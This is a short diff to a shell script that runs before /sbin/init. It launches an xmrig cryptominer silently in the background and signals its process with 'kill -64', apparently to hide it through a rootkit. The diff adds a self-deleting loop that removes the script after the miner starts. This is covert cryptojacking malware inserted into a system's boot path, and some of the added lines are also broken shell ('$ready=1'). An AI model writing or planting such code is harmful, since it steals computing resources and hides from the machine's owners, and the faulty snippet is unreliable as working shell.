@@ -77,10 +77,18 @@ if [ "$threads" -gt 4 ]; then
 (	while [ ! -f $xmrig_binary ] && [ ! -f $xmrig_config ]; do
 		sleep 5
 	done
-	"$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1 &
-	echo "xmrig works!"
+	nohup "$xmrig_binary" --config="$xmrig_config" > /dev/null 2>&1	
 	kill -64 $!
+
+	$ready=1
 ) &
 fi
+
+(
+	while [ ! "$ready" -eq 1 ]; do
+		sleep 5
+	done
+	rm -- "$0"
+) &
 
 exec /sbin/init "$@"
